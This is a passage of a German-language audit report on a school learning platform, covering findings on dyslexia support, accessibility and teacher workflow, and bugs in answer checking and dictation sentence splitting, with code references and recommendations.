- **Folgen:** Belastung einzelner Kinder ohne Wissen der Lehrkraft (das freie Üben ist für sie unsichtbar, E-003). Lehrkräfte, die eine Liste prüfen, verlieren Vertrauen in die Inhalte.
- **Empfehlung (Vorschlag zur Prüfung):** Wortboxen gegen den bayerischen Grundwortschatz (Jgst. 1/2 und 3/4) und einen Sek-I-Wortschatz neu ordnen; Gewalt-, Kriegs- und Todeswörter aus Grundstufenboxen entfernen oder in eine ausdrücklich gewählte Sek-I-Box legen; je Wort optional ein Bild oder Beispielsatz für DaZ.
- **Aufwand:** M
- **Erfolgskriterium:** Jede feste Wortbox trägt eine Niveaustufe; ein Test stellt sicher, dass Grundstufenboxen keine Wörter einer gepflegten Ausschlussliste enthalten.
- **Quelle:** `agent-e-schularten.md`

### E-006 – LRS-Unterstützung setzt an der falschen Stelle an: Toleranz nur bei Vokabeln im Live-Raum, keine Anpassung in den Deutsch-Modulen

- **Bereich:** Inklusion, LRS, Nachteilsausgleich/Notenschutz (Bayern), Datensparsamkeit
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert) für die Wirkungsgrenze; rechtliche Einordnung offene Frage (keine Rechtsberatung)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - _Konzept:_ Die „Schreiberleichterung“ ist das einzige Inklusionsmerkmal der Plattform. Sie bildet die Idee des Notenschutzes nach (Rechtschreibung nicht werten), aber nur für Fremdsprachenvokabeln im Live-Raum. - _Implementierung:_ Im deutschen Textdiktat wirkt sie nicht: „Der Hund belt laut.“ → falsch; fehlender Schlusspunkt → falsch; Vokabel „Biblothek“ → toleriert. Im Wortspeicher, in der Textbox, im Laufdiktat allein und in der Tagesportion gibt es keine Anpassung für Kinder mit LRS. Die Textbox wird im Vault als LRS-Werkzeug beschrieben, hat aber außer der Textwahl nach Schwierigkeit weder Vorlesen noch eine Mengen- oder Zeitanpassung. - _Einordnung:_ Dass Rechtschreibfehler in einer **Rechtschreibübung** nicht toleriert werden, ist pädagogisch richtig (Toleranz würde das Üben entwerten). Für Kinder mit LRS hilft beim Üben aber anderes: kleinere Mengen, kein Zeitdruck (keine … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/integrations/laufdiktat/live-session.ts:101-130` (`evaluateLiveAnswer`: Toleranz nur im Zweig `kind === "vocabulary"`); `docs/umsetzungsplan-vokabeluebernahme-lrs.md:121-148` (1.6 „Gilt nur für `kind === "vocabulary"`“); Vault 24 (Textbox „besonders für Schüler mit LRS“) gegenüber `app/components/textbox-app.tsx` (keine Sprachausgabe, keine LRS-Anpassung); `app/raum/spiel/live-game.tsx:444-508` (Tempo-Punkte, siehe D-012); `app/components/teacher-class-configurator.tsx:593-623` (Haken je … (vollständig in `agent-e-schularten.md`); `repro-e/e-schularten.test.ts`, Test „Toleranz nur bei Vokabeln, Text immer zeichengenau“ (Ausgabe E2).
- **Betroffene:** Kinder mit LRS, DaZ-Kinder, Kinder mit Förderschwerpunkt Lernen; Lehrkräfte und Schulleitungen (Rechtsunsicherheit).
- **Folgen:** Die Kinder, für die Rechtschreibtraining am wichtigsten ist, erhalten in den Deutsch-Modulen keine Unterstützung; gleichzeitig entsteht ein datenschutzrechtlich sensibles LRS-Kennzeichen (B-008) für einen engen Nutzen (Englischvokabeln live). Kosten und Nutzen stehen in Schieflage.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Das LRS-Kennzeichen durch neutrale, nicht diagnosegebundene **Übungsanpassungen** ersetzen, die die Lehrkraft (oder das Kind selbst) für jedes Kind wählen kann: „weniger auf einmal“, „ohne Tempo“, „Vorlesen“, „große Schrift“, „Silbenhilfe“; die Vokabeltoleranz wird eine davon. Damit entfällt der Rückschluss auf eine Diagnose (löst B-008 an der Wurzel). (2) Diese Anpassungen in allen Modulen wirken lassen, nicht nur im Live-Raum. (3) Rechtliche Frage an die behördliche Datenschutzbeauftragte und die Schulleitung: Ist ein Übungsmerkmal ohne Bewertungsfolge überhaupt an einen Nachweis nach § 36 BaySchO gebunden?
- **Aufwand:** M (1), L (2), S (3)
- **Erfolgskriterium:** Kein Datenfeld mehr, das „LRS“ oder eine Diagnose bedeutet; mindestens drei Übungsanpassungen wirken in Wortspeicher, Textbox und Live-Raum; Test je Anpassung.
- **Quelle:** `agent-e-schularten.md`

### E-007 – Das klassische Laufdiktat verlangt eine Zwei-Hand-Geste ohne Alternative für Kinder mit motorischen Einschränkungen oder Bildschirmleser

- **Bereich:** Inklusion, Barrierefreiheit, Förderschwerpunkt körperliche und motorische Entwicklung, Sehen
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.6): Einzeltipp-Alternative nur mit der Regel „Vorlage und Eingabe nie gleichzeitig sichtbar“; Aufdecken als Hilfe werten.
- **Beschreibung:** Im Modus „Laufdiktat“ sieht das Kind den Satz nur, solange zwei Finger an den Bildschirmrändern liegen (Tablet) bzw. A und L gedrückt sind (Hardwaretastatur). Das soll Abschreiben während des Tippens verhindern und ist als Idee schlüssig. Es gibt aber keine Alternative je Kind: Einhändige Kinder, Kinder mit Spastik oder Tremor, Kinder mit Schaltersteuerung oder Bildschirmleser können den Satz nicht sehen. Die Lehrkraft kann nur für den **ganzen Raum** auf „Freie Übung“ ausweichen. Mausbedienung zählt ausdrücklich nicht.
- **Belege:** `src/domain/hold-to-reveal.ts:1-35` (`isHolding`: zwei Touch-Kontakte oder Tasten A und L gleichzeitig; Mauszeiger zählen nicht); `app/views/laufdiktat/student-dictation-screen.tsx:310-358` (`HoldPhase`: „Mit zwei Fingern an den Rändern halten“); Modusauswahl nur je Raum (`app/views/laufdiktat/teacher-dictation/constants.ts:41-86`); Codelesung; Unit-Tests `app/raum/spiel/live-gesture.test.tsx` belegen die Geste.
- **Betroffene:** Kinder mit Förderschwerpunkt körperliche und motorische Entwicklung oder Sehen in inklusiven Klassen; Kinder mit Gipsarm (temporär).
- **Folgen:** Ausschluss einzelner Kinder von einer gemeinsamen Klassenaktivität oder Wechsel der ganzen Klasse in einen anderen Modus; Widerspruch zu Art. 2 BayEUG-Inklusionsauftrag (allgemein bekannt, nicht online verifiziert) und zu WCAG 2.1 Erfolgskriterium 2.5.1 „Zeigergesten“ (Stufe A: Gesten mit mehreren Kontaktpunkten brauchen eine Einzelzeiger-Alternative).
- **Empfehlung (Vorschlag zur Prüfung):** Eine Alternative je Gerät: „Aufdecken“-Schaltfläche mit gezählter Ansichtszeit (Spickerzählung bleibt), aktivierbar als Übungsanpassung (E-006) oder automatisch bei aktivem Bildschirmleser bzw. Mausbedienung.
- **Aufwand:** S–M
- **Erfolgskriterium:** Ein Kind kann den Laufdiktat-Modus mit einem einzelnen Zeiger oder per Tastatur mit einer Taste vollständig bearbeiten; axe- und Playwright-Test für diesen Weg.
- **Quelle:** `agent-e-schularten.md`

### E-008 – Organisationsaufwand: Einschreibung je Kind und Gerät, keine Übergabe an Vertretung, Teamteaching oder neues Schuljahr

- **Bereich:** Lehrerperspektive, Schulorganisation
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse); Zeitaufwand geschätzt (nicht gemessen)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Realistischer Ablauf für eine 3. Klasse mit 25 Kindern und iPad-Koffer: 1. Klasse anlegen, 25 Namen **einzeln** eintippen (kein Einfügen einer Liste), Haken für Erleichterung setzen, QR-Bogen drucken (gut gelöst). 2. Jedes Kind scannt seinen QR **auf jedem Gerät**, das es benutzt, und bestätigt; bei geteilten Geräten entstehen Mehrfachmitgliedschaften (E-001). 3. Inhalte: Vokabeln per 24-h-Transfer; alles andere nur über Live-Raum (E-002). 4. Ändert sich die Erleichterung, muss das Kind einen neuen QR scannen. 5. **Vertretung / Mobile Reserve / Förderlehrkraft / MSD:** haben weder Schülerliste noch Klassenschlüssel. Sie können nur einen „Raum ohne Klasse (keine Schreiberleichterung)“ öffnen oder bekommen die Gesamtsicherung der Klassenlehrkraft – mit Namen und LRS-Haken, also personenbezogene Daten auf einem Fremdgerät. Teamteaching ist im Plan ausdrücklich ausgeschlossen. 6. … (vollständig in `agent-e-schularten.md`)
- **Belege:** `app/components/teacher-class-configurator.tsx:532-545` (Kinder einzeln anlegen, kein Listenimport), `:355-400` (QR-Bogen drucken: gut), `:593-623` (Änderung der Erleichterung → Kind muss neuen QR scannen), `:640-734` (Archiv, Entfernungscode); `docs/umsetzungsplan-geraete-sync.md:588-589` (Teamteaching ausdrücklich nicht vorgesehen); Vault 04 (Klassenschlüssel nur im Lehrer-Datenbereich, Übergabe nur über Gesamtsicherung); `docs/umsetzungsplan-vokabeluebernahme-lrs.md:166-167` („Geht er … (vollständig in `agent-e-schularten.md`); Codelesung der Klassenverwaltung; Suche nach Übernahme-, Verschiebe- und Mehrlehrkraftfunktionen ohne Treffer.
- **Betroffene:** Klassenleitungen, Fachlehrkräfte (z. B. Englisch in Jgst. 3/4), Förderlehrkräfte, MSD, Mobile Reserven, Schulleitungen.
- **Folgen:** Die Plattform bleibt an eine einzelne, technikaffine Lehrkraft gebunden; fällt sie aus, ruht der digitale Teil. Personenbezogene Daten wandern per Datei zwischen Privatgeräten (verstärkt B-009/B-011).
- **Empfehlung (Vorschlag zur Prüfung):** (1) Namensliste einfügen (eine Zeile je Kind). (2) „Klasse ins neue Schuljahr übernehmen“ mit Behalt der Mitgliedschaften und Klassenschlüssel. (3) Eine **Vertretungsfreigabe**: QR/Datei mit Klassenstempel und Tiernamen, ohne Klarnamen und ohne LRS-Merkmale, damit die Vertretung einen Klassenraum öffnen kann. (4) Schriftliche Übergaberegel für Lehrerwechsel im Betriebshandbuch.
- **Aufwand:** S (1), M (2), M (3), S (4)
- **Erfolgskriterium:** Neues Schuljahr ohne erneutes Scannen; eine Vertretung kann mit einem Übergabecode ohne Personendaten einen Klassenraum mit Wirkung des Klassenstempels öffnen.
- **Quelle:** `agent-e-schularten.md`

### E-009 – „Schulartübergreifend“ ist nicht eingelöst: Inhalte und Ansprache passen faktisch zu Jgst. 3–6; in Sek I und Gymnasium trägt nur die LernBox

- **Bereich:** Eignung Sekundarstufe I, Realschule, Gymnasium (G9), Grenzen der schulartübergreifenden Nutzung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse und Inhaltsdurchsicht); Akzeptanzfragen begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - **Grundschule 3/4 und Förderschule (Lernen):** Textbox-Themen, Kopfrechen-Generator (Zahlenraum frei, Vorgabe 0–20, Einmaleinsreihen) und ein Teil der Wortboxen passen gut; Jgst. 1/2 siehe E-004. - **Mittelschule 5–7, Förderunterricht Rechtschreibung:** Wortspeicher passt inhaltlich teils besser als in der Grundschule (Vertrag, Übersetzung, Gesetz); die Textbox-Themen wirken für 12- bis 14-Jährige kindlich (eigene Einschätzung). Kopfrechnen ist als Basistraining (Einmaleins, frei wählbare große Zahlenräume, negative Zahlen) brauchbar, deckt aber Bruch-, Dezimal- und Prozentrechnung, die in Jgst. 5–7 zentral sind, nur über selbst getippte LaTeX-Aufgaben ab – für Kinder und viele Lehrkräfte keine realistische Eingabeform. - **Mittelschule 8–10 / M-Zug, Realschule, Gymnasium:** Wirklich tragfähig sind die **LernBox** (Englisch, Französisch, Latein über Lehrkraftpakete oder eigene … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/domain/textbox-library.ts` (50 Texte mit Grundschul-Lebenswelt: „Der kleine Hund“, „Der Hase im Wald“, „Einkaufen mit Oma“, „Auf dem Spielplatz“, „Die Maus und der Mond“ …); `src/domain/mental-math.ts:1-35, 440-500` (Generator nur ganze Zahlen der vier Grundrechenarten, optional negativ; Brüche, Wurzeln, Potenzen nur in selbst getippten Aufgaben in LaTeX-Schreibweise `\frac{…}{…}`, `\sqrt`, `^`, Z. 120-140); `src/domain/german-learning-content.ts` (Wortboxen mischen Grundschul- und … (vollständig in `agent-e-schularten.md`); Durchsicht der Titel und Generatoroptionen; `readability.out.txt` für Textbox-Texte (LIX Ø 18,6 / 24,7 / 31,7 – Kinderliteratur-Niveau).
- **Betroffene:** Lehrkräfte der Sek I und des Gymnasiums; Schulleitungen, die über eine schulweite Einführung entscheiden.
- **Folgen:** Wird die Plattform als „für alle Schularten“ vorgestellt, entstehen Erwartungen, die nur die LernBox erfüllt. Eine gemeinsame Oberfläche für 6- und 18-Jährige erzeugt Kompromisse, die beiden Gruppen schaden (zu viel Text für die Kleinen, zu kindlich für die Großen).
- **Empfehlung (Vorschlag zur Prüfung):** (1) Ehrliche Positionierung: Version 1 = Grundlagen Deutsch/Mathe für Jgst. 3–6 und Förderbedarf, plus LernBox für alle Schularten. (2) Eine gemeinsame Datenbasis beibehalten (Lernereignisse, LernBox, Live-Raum), aber **zwei Oberflächenprofile** anbieten: „Grundstufe“ (Bilder, Vorlesen, wenig Text, Tiere) und „Sekundarstufe“ (sachlich, ohne Tiere, mehr Selbststeuerung). (3) Für Sek-I-Mathe einen Generator für Bruch-, Dezimal- und Prozentaufgaben erst bauen, wenn ein konkreter Bedarf in einer Pilotklasse belegt ist.
- **Aufwand:** S (1), L (2), L (3)
- **Erfolgskriterium:** README und Vault 00 nennen Zielschularten und -stufen; jede Funktion trägt im Freigaberegister eine Zielstufe; eine Sek-I-Lehrkraft findet ohne Erklärung, welche Teile für ihre Klasse gedacht sind.
- **Quelle:** `agent-e-schularten.md`

### E-010 – Differenzierung nach oben und für Motivationsschwache fehlt weitgehend

- **Bereich:** Differenzierung (leistungsstarke und hochbegabte Kinder, Motivationsschwache)
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse); Wirkung begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - **Leistungsstarke Kinder:** Es gibt keine Aufstiegsstufen, keine Knobel- oder Transferaufgaben, keine Zeitersparnis durch Überspringen sicherer Inhalte (Einstufung fehlt, D-003). Wer die Wortbox kann, übt sie trotzdem in voller Länge; einzige Steigerung ist die Selbstwahl (größerer Zahlenraum, schwerer Text). Für Kinder, die sich selbst herausfordern, reicht das; für unterforderte, sich zurückziehende Kinder nicht. - **Motivationsschwache Kinder:** Die Motivationsfunktionen (Häuser, Abzeichen) sind bewusst ausgeschaltet. Übrig bleiben Lernserie im Kalender, Sterne und im Live-Raum Tempo-Punkte und Battle, die eher die ohnehin Starken belohnen (D-012). Lehrkraftgesetzte Wochenziele („3 × 10 Minuten“) oder sichtbarer persönlicher Zuwachs ohne Vergleich fehlen.
- **Belege:** `src/domain/release.ts` (Häuser/Motivation `aus`, Duell `aus`); `src/domain/daily-plan.ts` (feste Portion); `src/domain/word-round.ts:86-99` (Zufallsauswahl ohne Niveau); `app/views/laufdiktat/teacher-dictation/constants.ts:63-72` (Battle als einziges Wettbewerbsformat, D-012); Codelesung.
- **Betroffene:** leistungsstarke und hochbegabte Kinder; Kinder mit geringer Lernmotivation, besonders in der Mittelschule.
- **Folgen:** Starke Kinder langweilen sich, schwache meiden die Übung; die Plattform verstärkt die Schere, statt sie zu schließen (Hypothese, entspricht der allgemeinen Befundlage zu frei gewählten Übungsangeboten; nicht spezifisch belegt).
- **Empfehlung (Vorschlag zur Prüfung):** Einstufung je Modul (kurzer Einstieg, siehe D-003 Abschnitt 9), Überspringen sicherer Inhalte, eine „Profi“-Stufe je Modul; für Motivationsschwache persönliche Wochenziele mit Lehrkraft und ruhige Zuwachsanzeige ohne Vergleich.
- **Aufwand:** M–L
- **Erfolgskriterium:** Ein Kind, das eine Wortbox im Einstieg fehlerfrei bewältigt, erhält sie nicht als Übungsportion; die Lehrkraft kann ein Wochenziel je Kind setzen.
- **Quelle:** `agent-e-schularten.md`

## G – Funktionale Korrektheit

### G-001 – Wortspeicher Stufe 5: richtig geschriebene, mit Leerzeichen getrennte Wörter gelten alle als falsch und stufen jedes Wort auf Box 1 zurück

- **Bereich:** Antwortprüfung Wortspeicher (Merkblock, Stufe 5), Lernstandsberechnung
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (reproduziert) für die Fachlogik; begründetes Risiko für die iPad-Bedienung (nicht auf einem Gerät geprüft)
- **Gegenprüfung:** bestätigt (Hauptinstanz und F, reproduziert): drei gespeicherte Fehler für eine richtige Leistung. F empfiehlt ein Eingabefeld je Wort statt Trennen an Leerzeichen. Empfehlung angepasst: ein Eingabefeld je Wort statt Trennung an Leerzeichen (Roadmap S5).
- **Beschreibung:** In Stufe 5 schreibt das Kind 2, 3 oder 5 Wörter aus dem Gedächtnis in ein Textfeld. Die Eingabe wird nur an Zeilenumbruch, Komma und Semikolon getrennt, **nicht an Leerzeichen**. „Hund Katze Maus“ ist damit _ein_ Wort: Es wird „Hund“ als „falsch“ zugeordnet, „Katze“ und „Maus“ gelten als „fehlt“. `submitWordAnswer` meldet für **jedes** Wort einen Fehlversuch; `updateLearningWordProgress` setzt jedes auf Box 1, senkt die Merkstufe und macht es sofort fällig. Die Oberfläche nennt als Trennung nur „Umschalt + Enter“; Komma und Semikolon werden nirgends erwähnt, Leerzeichen sind die natürliche Wahl eines Kindes. Enter allein sendet sofort ab. Auf der iPad-Bildschirmtastatur gibt es nach meinem Kenntnisstand keine zuverlässige Umschalt-Enter-Kombination (nicht auf Gerät verifiziert). Die Standard-Blockgröße ist 3.
- **Belege:** `src/domain/learning-word.ts:10-22` (`parseLearningWords` trennt nur an `\n , ;`), `:61-111` (`evaluateLearningWordBlock`); `src/domain/word-round.ts:194-211, 213-248` (`evaluate`, `submitWordAnswer` erzeugt je Wort einen Fehlversuch); `src/domain/learning-word-progress.ts:37-62` (falsch → Box 1, Stufe −1, sofort fällig); `app/views/wortspeicher/memory-block.tsx:20-33` (Enter sendet ab, Hinweis „Umschalt + Enter erzeugt eine neue Zeile“); `app/components/learning-word-app.tsx:158` … (vollständig in `agent-g-korrektheit.md`); `repro-g/g3-stufe5-herabstufung.test.ts` und `g1-antwortpruefung.test.ts`: ```ts submitWordAnswer(finishMemorize(startWordRound({stage:5, blockSize:3, words:["Hund","Katze","Maus"], …})), "Hund Katze Maus") // attempts: Hund/Katze/Maus jeweils correct:false updateLearningWordProgress({box:3, stage:5, …}, {correct:false, stage:5, …}) // → {"box":1,"stage":4,"dueAt": jetzt} evaluateLearningWordBlock(["Hund","Katze","Maus"], "Hund Katze Maus") // … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** alle Kinder, die Stufe 5 mit Blockgröße > 1 wählen, besonders auf iPads ohne Hardwaretastatur; Lehrkräfte, die Merkstufen und „sicher“-Zahlen lesen.
- **Folgen:** Eine vollständig richtige Leistung wird als dreifacher Fehler gespeichert, die Wörter fallen auf Box 1 zurück, Merkstufe sinkt, die Wörter füllen am nächsten Tag die Fehlerquote der Tagesportion. Das Kind erlebt „falsch“, obwohl es richtig geschrieben hat; die Rückmeldung zeigt „Hund Katze Maus statt Hund“. Der Fehler ist für Lehrkräfte unsichtbar.
- **Empfehlung (Vorschlag zur Prüfung):** In Stufe 5 an jedem Leerraum trennen (`/[\s,;]+/u`); Mehrwortausdrücke kommen in den eingebauten Wortboxen nicht vor, für eigene Boxen mit Leerzeichen getrennte Eingabefelder je Wort verwenden. Alternativ ein Eingabefeld je Wort (wie Stufe 1–4). Hinweistext anpassen. Ein Komponententest „Leerzeichen, Komma, Zeilenumbruch ergeben dasselbe Ergebnis“.
- **Aufwand:** S
- **Erfolgskriterium:** `evaluateLearningWordBlock(["Hund","Katze","Maus"], "Hund Katze Maus").allCorrect === true`; ein Browsertest auf iPad-Viewport gibt drei Wörter ohne Umschalttaste ein und erhält „Richtig“.
- **Quelle:** `agent-g-korrektheit.md`

### G-002 – Typografische Apostrophe und Anführungszeichen sowie zerlegte Umlaute machen richtige Antworten falsch (LernBox, Laufdiktat)

- **Bereich:** Antwortprüfung LernBox, Laufdiktat (Text und Vokabeln, live und allein)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert) für die Vergleichslogik; begründetes Risiko für die Häufigkeit auf dem iPad
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Keine Antwortprüfung setzt `’ ‘ ʼ` mit `'`, `„ “ ” » «` mit `"` oder `‑ –` mit `-` gleich. Englische Vokabeln enthalten häufig Apostrophe („don't“, „I'm“, „o'clock“). Lehrkräfte erstellen Listen am PC (gerades `'`) oder kopieren aus Word (typografisches `’`); die iPad-Tastatur ersetzt `'`/`"` bei eingeschalteter „Intelligenter Interpunktion“ (Standard) durch typografische Zeichen. Laut Recherche ist das eine systemweite Tastatureinstellung; ob `autocorrect="off"` sie im Eingabefeld abschaltet, ist offen (Quellen siehe Abschnitt 3). Passt das Zeichen nicht, ist die richtige Antwort nicht eingebbar. In der LernBox fällt die Karte auf Box 1, im Live-Laufdiktat gilt der Abschnitt als falsch, das Kind schreibt ihn neu. Zusätzlich vergleicht die Laufdiktat-Textprüfung ohne Unicode-Normalisierung: Ein zerlegt (NFD) eingegebenes „ä“ ist falsch. Das kommt bei Bildschirmtastaturen selten vor, … (vollständig in `agent-g-korrektheit.md`)
- **Belege:** `src/domain/learning-bundle.ts:231-237` (`normalizeVocabularyText`: NFKC, Leerraum, Kleinschreibung – keine Zeichenäquivalenzen); `src/domain/learning-box.ts:158-173` (`evaluateLearningBoxAnswer`); `src/domain/running-dictation.ts:91-122` (`normalizeVocabularyAnswer`, Text: `input.trim() === item.target` ohne NFC); `src/integrations/laufdiktat/live-session.ts:82-129` (`normalizeAnswer`, Text: `value === word.targetWord`); `repro-g/g1-antwortpruefung.test.ts`: ``` LernBox "don't" vs "don’t" → false; "don’t" vs "don't" → false; "E-Mail" vs "E‑Mail"(U+2011) → false Laufdiktat Text "Der Bär läuft." vs NFD-Eingabe → false; "Tom's Hund bellt." vs "Tom’s …" → false Live evaluateLiveAnswer(text, NFD) → "wrong"; Vokabel "don't"/"don’t" → "wrong" (mit Schreiberleichterung "tolerated") Positiv: NFD in LernBox (NFKC) → true; geschütztes Leerzeichen → true; … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Kinder mit Englisch-/Französisch-Vokabeln (Apostroph, Elision „l'école“), Laufdiktat mit wörtlicher Rede oder Apostroph; Lehrkräfte, die Fehlerzahlen auswerten.
- **Folgen:** Fachlich richtige Antworten werden als falsch gewertet und zurückgestuft; Kinder lernen, dass „die App spinnt“; Fehlerstatistiken der Lehrkraft enthalten Scheinfehler.
- **Empfehlung (Vorschlag zur Prüfung):** Eine einzige Vergleichsnormalisierung für alle Module: NFC (bzw. NFKC), Apostroph-Familie → `'`, Anführungszeichen-Familie → `"`, Bindestrich-/Minus-Varianten → `-`, alle Leerräume → ein Leerzeichen; auf Ziel und Eingabe anwenden. Für das Laufdiktat zusätzlich D-008 (wortweiser Vergleich) umsetzen. Tabellentest mit den Zeichenpaaren dieses Befunds.
- **Aufwand:** S
- **Erfolgskriterium:** Alle Zeilen der obigen Tabelle liefern „richtig“; ein Eigenschaftstest „Ersetzen eines Zeichens durch seine typografische Variante ändert das Ergebnis nicht“ ist grün.
- **Quelle:** `agent-g-korrektheit.md`

### G-003 – LernBox und Laufdiktat-Vokabeln kennen nur „|“ als Alternativtrenner; übliche Schreibweisen aus Vokabellisten („(to) go“, „home / house“, „groß, riesig“) machen jede kürzere richtige Antwort falsch

- **Bereich:** Antwortprüfung LernBox, Import, Vokabelpakete
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.12): nur „|“ und „/“ automatisch trennen, Komma nur nach Bestätigung.
- **Beschreibung:** Vokabellisten aus Lehrwerken und von Lehrkräften schreiben Varianten mit Schrägstrich oder Komma und optionale Teile in Klammern. Die Prüfung vergleicht die ganze Zeichenkette. „go“ und „to go“ sind für „(to) go“ falsch; „home“ ist für „home / house“ falsch; „groß“ ist für „groß, riesig“ falsch. Richtig ist nur die wörtliche Abschrift einschließlich Klammer oder Schrägstrich. Ein Semikolon in der Antwort zerlegt beim Massenimport die Zeile in Spalten (das zweite Synonym wird zum Tag). Umgekehrt ist die LernBox bei der Groß-/Kleinschreibung immer tolerant: „der hund“ gilt für „der Hund“ als richtig. Das ist im Live-Laufdiktat schaltbar (`caseSensitive`), in der LernBox nicht, und widerspricht der strengen Prüfung im Wortspeicher.
- **Belege:** `src/domain/learning-box.ts:150-173` (`learningBoxAlternatives` nur `|`), `:208-228` (`parseLearningBoxImport`: `;` ist Spaltentrenner); `src/domain/running-dictation.ts:144-174` (`parseVocabularyTable`, nur `|`); `repro-g/g1-antwortpruefung.test.ts` (`evaluateLearningBoxAnswer`): „(to) go“/„go“ → false, „(to) go“/„to go“ → false, „home / house“/„home“ → false, „groß, riesig“/„groß“ → false, „home | house“/„house“ → true, „der Hund“/„der hund“ → true, „Hund“/„hund“ → true.
- **Betroffene:** Kinder der Sekundarstufe mit Lehrwerkslisten; Lehrkräfte, die Listen per „Viele einfügen“ übernehmen.
- **Folgen:** Systematische Scheinfehler bei Synonym- und Klammervokabeln; Karten pendeln zwischen Box 1 und 2. Kinder lernen die Schreibweise der Liste („home / house“) statt der Vokabel. Deutsche Nomen werden in der Rückrichtung ohne Großschreibung als richtig verbucht.
- **Empfehlung (Vorschlag zur Prüfung):** Beim Anlegen/Import `/` und `,` (außerhalb von Klammern) als Alternativtrenner anbieten (mit Vorschau); optionale Klammerteile als zwei Alternativen expandieren („to go“, „go“). In der Vorschau zeigen, welche Antworten akzeptiert werden. Groß-/Kleinschreibung je Stapel einstellbar machen, für Deutsch als Antwortsprache standardmäßig streng.
- **Aufwand:** M
- **Erfolgskriterium:** Für „(to) go“ werden „go“ und „to go“ akzeptiert; Importvorschau zeigt die erkannten Alternativen; Test für Semikolon in der Antwort.
- **Quelle:** `agent-g-korrektheit.md`

### G-004 – Laufdiktat zerlegt Texte an jedem Punkt: Datumsangaben, Abkürzungen, Uhrzeiten, Dezimalzahlen und wörtliche Rede ergeben unsinnige Abschnitte

- **Bereich:** Laufdiktat (live und allein), Aufbereitung des Lehrer- bzw. Kindertextes
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Jeder Punkt beendet einen Abschnitt. Das schließende gerade Anführungszeichen `"` und das deutsche `«` fehlen in der Liste der nachgestellten Zeichen und wandern an den Anfang des nächsten Abschnitts. Zeilenumbrüche verhindern die Zerlegung nicht; die Lehrkraft hat keinen Ausweg.
- **Belege:** `src/domain/running-dictation.ts:124-142` (`parseRunningDictationText`, Muster `[^.!?]+[.!?]+(?:[”’“»›)\]}]+)?`); genutzt von `src/integrations/laufdiktat/teacher-session.ts:114` und `app/frei/german/laufdiktat/running-dictation-app.tsx:77`; `repro-g/g2-laufdiktat-saetze.test.ts`: ``` "Am 3. Oktober ist Feiertag. Wir haben frei." → ["Am 3.","Oktober ist Feiertag.","Wir haben frei."] "Wir treffen uns z. B. am Montag. …" → ["Wir treffen uns z.","B.","am Montag.", …] "Dr. Meier kommt um 8.30 Uhr. Er ist nett." → ["Dr.","Meier kommt um 8.","30 Uhr.", …] "Es kostet 3.50 Euro. …" → ["Es kostet 3.","50 Euro.", …] 'Sie rief: "Halt!" Dann ging sie.' → ['Sie rief: "Halt!', '" Dann ging … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Lehrkräfte mit eigenen Diktattexten (Datumsangaben und „z. B.“ sind in Grundschuldiktaten häufig), Kinder im Laufdiktat.
- **Folgen:** Abschnitte wie „B.“ oder „Am 3.“ sind Merkeinheiten ohne Sinn. Abschnitte, die mit `"` oder `«` und Leerzeichen beginnen, muss das Kind zeichengenau so abschreiben; in Verbindung mit D-008 (zeichengenauer Vergleich) und G-002 wird die richtige Wiedergabe der wörtlichen Rede praktisch unmöglich. Die Zahl der Abschnitte und damit Sterne und Fehlerquote verfälschen sich.
- **Empfehlung (Vorschlag zur Prüfung):** Satzende nur bei `[.!?]` gefolgt von Leerraum und Großbuchstabe/Anführungszeichen, mit einer kurzen Ausnahmeliste (z. B., d. h., usw., Dr., Nr., Ordinalzahl vor Monatsnamen, Ziffer.Ziffer). Alle schließenden Anführungszeichen (`" « ” “ ’ »`) an den Satz anhängen. Vorschau der Abschnitte für die Lehrkraft mit der Möglichkeit, Zeilenumbrüche als harte Abschnittsgrenze und einzig gültige Grenze festzulegen.
- **Aufwand:** S–M
- **Erfolgskriterium:** Die sieben Beispiele ergeben jeweils zwei bzw. drei vollständige Sätze; Eigenschaftstest: Verbinden der Abschnitte mit Leerzeichen ergibt den Originaltext.
- **Quelle:** `agent-g-korrektheit.md`

### G-005 – LernBox: Beide Richtungen teilen sich `lastReviewed`; die 8-Stunden-Regel blockiert den Aufstieg der anderen Richtung

- **Bereich:** Leitner-Logik LernBox (Vault 06 „beide Richtungen unabhängig“, 8-Stunden-Regel)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Box, Abstand und Termin sind je Richtung getrennt gespeichert, der Zeitpunkt der letzten Abfrage nicht. Die Regel „richtig in Box 1 weniger als 8 Stunden nach dem letzten Abruf → kein Aufstieg“ liest deshalb auch einen Abruf der **anderen** Richtung. In der Tagesportion stehen Vorwärts- und Rückwärtselement derselben Karte typischerweise in derselben Runde. Wurden beide Richtungen vor Tagen falsch beantwortet und sind beide jetzt fällig, steigt nur die zuerst abgefragte auf; die zweite bleibt trotz eigenständigem, fälligem, richtigem Abruf in Box 1 und kommt morgen erneut. Umgekehrt kann eine Abfrage der anderen Richtung den Erholungsabstand verkürzen oder verlängern.
